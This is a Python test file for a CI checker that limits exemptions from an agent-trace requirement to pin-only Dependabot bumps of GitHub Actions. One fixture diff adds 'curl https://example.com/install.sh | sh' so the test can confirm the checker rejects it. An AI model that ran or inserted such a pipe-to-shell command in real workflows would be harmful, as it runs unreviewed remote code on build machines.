#!/usr/bin/env python3
"""Blackbox tests for check-agent-trace-requirement.py's dependency-bump exemption.

Runnable standalone: `python3 scripts/ci/tests/test_check_agent_trace_requirement.py`
(no pytest dependency; the repo has no existing Python test framework to match).
Invokes the checker as a subprocess against a temp copy of the real policy/trace
files so the test exercises the exact CLI contract the Agent Behavior workflow
uses, not internals that could drift from it.
"""
import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[3]
SCRIPT = REPO_ROOT / "scripts" / "ci" / "check-agent-trace-requirement.py"
POLICY = REPO_ROOT / ".agents" / "evals" / "risk-policy.json"
STANDING_TRACE = REPO_ROOT / ".agents" / "evals" / "traces" / "dependency-bump.json"

UPGRADE_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
"""

NON_PIN_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,8 +10,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
+      - run: curl https://example.com/install.sh | sh
"""


class RunResult(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="trace-req-test-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        # Real policy + a real standing trace copied alongside it, so the
        # exemption's `Path(standingTrace).exists()` check resolves relative
        # to the process cwd exactly like it does in CI.
        (self.tmp / ".agents" / "evals" / "traces").mkdir(parents=True)
        shutil.copy(POLICY, self.tmp / ".agents" / "evals" / "risk-policy.json")
        shutil.copy(STANDING_TRACE, self.tmp / ".agents" / "evals" / "traces" / "dependency-bump.json")

    def run_checker(self, changed_files, pr_author=None, workflow_diff=None):
        changed_path = self.tmp / "changed.txt"
        changed_path.write_text("\n".join(changed_files) + "\n")
        cmd = [
            sys.executable, str(SCRIPT),
            "--policy", ".agents/evals/risk-policy.json",
            "--changed-files", str(changed_path),
        ]
        if pr_author is not None:
            cmd += ["--pr-author", pr_author]
        if workflow_diff is not None:
            diff_path = self.tmp / "workflow.diff"
            diff_path.write_text(workflow_diff)
            cmd += ["--workflow-diff", str(diff_path)]
        proc = subprocess.run(cmd, cwd=self.tmp, capture_output=True, text=True)
        try:
            report = json.loads(proc.stdout)
        except json.JSONDecodeError:
            report = None
        return proc.returncode, report, proc.stderr

    def test_dependabot_uses_only_bump_passes(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml"],
            pr_author="dependabot[bot]",
            workflow_diff=UPGRADE_DIFF,
        )
        self.assertEqual(rc, 0, stderr)
        self.assertTrue(report["traceRequired"])
        self.assertFalse(report["traceChanged"])
        self.assertTrue(report["traceExempt"])

    def test_dependabot_bump_with_run_line_edit_fails(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml"],
            pr_author="dependabot[bot]",
            workflow_diff=NON_PIN_DIFF,
        )
        self.assertEqual(rc, 1)
        self.assertFalse(report["traceExempt"])
        self.assertIn("non-`uses:`", report["traceExemptionDetail"])

    def test_dependabot_bump_missing_workflow_diff_fails_closed(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml"],
            pr_author="dependabot[bot]",
            workflow_diff=None,
        )
        self.assertEqual(rc, 1)
        self.assertFalse(report["traceExempt"])

    def test_dependabot_touching_disallowed_file_fails(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml", "scripts/ci/check-mutable-inputs.py"],
            pr_author="dependabot[bot]",
            workflow_diff=UPGRADE_DIFF,
        )
        self.assertEqual(rc, 1)
        self.assertFalse(report["traceExempt"])
        self.assertIn("outside dependency-bump allowlist", report["traceExemptionDetail"])

    def test_human_workflow_edit_without_trace_fails(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml"],
            pr_author="a-human-contributor",
            workflow_diff=NON_PIN_DIFF,
        )
        self.assertEqual(rc, 1)
        self.assertFalse(report["traceExempt"])

    def test_human_with_trace_passes(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml", ".agents/evals/traces/2026-09-human-change.json"],
            pr_author="a-human-contributor",
        )
        self.assertEqual(rc, 0, stderr)
        self.assertTrue(report["traceChanged"])
        self.assertFalse(report["traceExempt"])

    def test_low_risk_change_never_needs_a_trace_or_exemption(self):
        rc, report, stderr = self.run_checker(["README.md"], pr_author="dependabot[bot]")
        self.assertEqual(rc, 0, stderr)
        self.assertFalse(report["traceRequired"])


if __name__ == "__main__":
    unittest.main()
